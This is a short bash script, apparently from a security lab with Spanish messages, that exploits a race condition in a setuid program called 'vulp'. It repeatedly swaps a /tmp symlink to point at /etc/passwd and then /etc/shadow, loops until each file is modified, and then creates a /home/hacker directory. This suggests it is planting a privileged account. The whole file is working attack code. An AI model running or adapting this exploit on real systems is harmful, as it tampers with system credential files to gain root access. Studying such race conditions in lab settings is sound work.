#!/bin/bash

passwdFunc () {
  PASSWD="ls -l /etc/passwd"
  old=$($PASSWD)
  new=$($PASSWD)
  while [ "$old" == "$new" ]
  do
    unlink "/tmp/XYZ" 
    ln -s "/etc/passwd" "/tmp/XYZ"
    ./vulp < pass_input
    new=$($PASSWD)  
    echo "running..."
  done
  echo "El archivo passwd ha cambiado"
  echo $old
  echo $new
}

shadowFunc () {
  PASSWD="ls -l /etc/shadow"
  old=$($PASSWD)
  new=$($PASSWD)
  while [ "$old" == "$new" ]
  do
    unlink "/tmp/XYZ" 
    ln -s "/etc/shadow" "/tmp/XYZ"
    ./vulp < shadow_input
    new=$($PASSWD)  
    echo "running..."
  done
  echo "El archivo shadow ha cambiado"
  echo $old
  echo $new

  mkdir "/home/hacker"
  echo "Created profile..."
}

passwdFunc
shadowFunc
exit 0
